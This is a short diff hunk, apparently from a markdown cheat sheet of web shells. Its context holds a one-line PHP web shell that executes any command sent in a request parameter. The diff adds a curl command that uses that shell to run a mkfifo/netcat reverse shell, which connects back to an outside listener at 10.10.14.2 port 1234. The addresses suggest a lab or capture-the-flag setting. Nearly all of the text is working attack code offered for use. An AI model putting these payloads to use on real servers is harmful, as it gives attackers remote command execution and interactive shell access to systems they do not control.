@@ -4,6 +4,9 @@
 
 ```php
 <?php system($_REQUEST["cmd"]); ?>
+
+curl http://10.10.10.150/index.php -G --data-urlencode 'cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 1234 >/tmp/f'
+
 ```
 
 ### jsp
